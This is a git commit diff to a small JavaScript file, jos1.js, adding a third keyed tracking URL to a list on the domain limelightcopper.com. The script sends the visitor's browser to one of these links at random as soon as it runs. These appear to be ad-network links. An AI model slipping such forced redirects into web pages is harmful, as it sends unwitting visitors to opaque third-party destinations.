ee090178aee99955b13817550f12b301e9c104a0
mahdi8844 <84512629+mahdi8844@users.noreply.github.com>
2021-05-29 16:56:13 +0800

    Update jos1.js

--- jos1.js
+++ jos1.js
@@ -1,7 +1,8 @@
 var dataUrl = [
   
   'https://limelightcopper.com/us5t0cbw?key=1c4590512e767b5008342ac53352ba10',
-  'https://limelightcopper.com/nf3rpr9q98?key=3f4cd0c002b2da2412ce482c8620ad89'
+  'https://limelightcopper.com/nf3rpr9q98?key=3f4cd0c002b2da2412ce482c8620ad89',
+  'https://limelightcopper.com/wyks8zsng?key=174a4a965d724aac2f3d8c535fbda8b8'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
